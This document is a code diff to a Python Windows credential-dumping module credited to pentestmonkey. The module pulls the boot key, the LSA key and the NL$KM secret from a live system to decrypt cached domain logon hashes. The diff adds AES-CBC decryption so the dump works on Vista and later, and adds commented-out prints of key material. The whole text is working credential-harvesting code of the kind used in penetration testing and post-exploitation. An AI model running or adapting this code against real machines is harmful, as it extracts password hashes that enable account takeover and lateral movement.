@@ -22,9 +22,9 @@
 # Modified by pentestmonkey
 
 from framework.win32.hashdumplive import get_bootkey
-from framework.win32.lsasecretslive import get_secret_by_name,get_lsa_key
+from framework.win32.lsasecretslive import get_secret_by_name,get_lsa_key,isXp
 from Crypto.Hash import HMAC
-from Crypto.Cipher import ARC4
+from Crypto.Cipher import ARC4, AES
 from struct import unpack
 from wpc.regkey import regkey
 
@@ -38,6 +38,22 @@ def decrypt_hash(edata, nlkm, ch):
     rc4 = ARC4.new(rc4key)
     data = rc4.encrypt(edata)
     return data
+
+
+def decrypt_hash_vista(edata, nlkm, ch):
+    """
+    Based on code from http://lab.mediaservice.net/code/cachedump.rb
+    """
+    aes = AES.new(nlkm[16:32], AES.MODE_CBC, ch)
+
+    out = ""
+    for i in range(0, len(edata), 16):
+        buf = edata[i : i + 16]
+        if len(buf) < 16:
+            buf += (16 - len(buf)) * "\00"
+        out += aes.decrypt(buf)
+    return out
+
 
 def parse_cache_entry(cache_data):
     (uname_len, domain_len) = unpack("<HH", cache_data[:4])
@@ -70,10 +86,13 @@ def dump_hashes():
         return []
 
     lsakey = get_lsa_key(bootkey)
+#    import binascii
+#    print "lsakey : %s"%(binascii.hexlify(lsakey))
     if not lsakey:
         return []
 
     nlkm = get_nlkm(lsakey)
+#    print "nlkm : %s"%(binascii.hexlify(nlkm))
     if not nlkm:
         return []
 
@@ -89,12 +108,16 @@ def dump_hashes():
 
         (uname_len, domain_len, domain_name_len, 
             enc_data, ch) = parse_cache_entry(data)
-        
+#        print "cache entry encodeddata: %s"%(binascii.hexlify(enc_data))
         # Skip if nothing in this cache entry
         if uname_len == 0:
             continue
-
-        dec_data = decrypt_hash(enc_data, nlkm, ch)
+        global xp
+        xp = isXp()
+        if xp:
+            dec_data = decrypt_hash(enc_data, nlkm, ch)
+        else:
+            dec_data = decrypt_hash_vista(enc_data, nlkm, ch)
 
         (username, domain, domain_name,
             hash) = parse_decrypted_cache(dec_data, uname_len,
